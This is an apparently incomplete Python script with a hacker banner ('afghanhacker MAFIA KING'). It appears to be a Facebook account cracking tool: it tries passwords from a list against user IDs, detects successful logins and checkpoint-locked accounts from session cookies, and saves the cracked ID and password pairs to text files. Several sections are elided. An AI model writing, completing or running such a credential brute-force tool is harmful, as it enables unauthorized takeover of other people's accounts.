...
//      // //         ////////        //      // //   // //     // 
\33[1;37m----------------------------------------------
→   Owner      :  afghanhacker MAFIA KING 💪
→   Facebook   :  SN JAN afghanhacker
→   Github     : SN afghanhacker
  →   Tools   :  RANDOM 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SN.afghanhacker-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SN.afghanhacker-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SN.afghanhacker-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SN.afghanhacker-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSN.afghanhacker\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
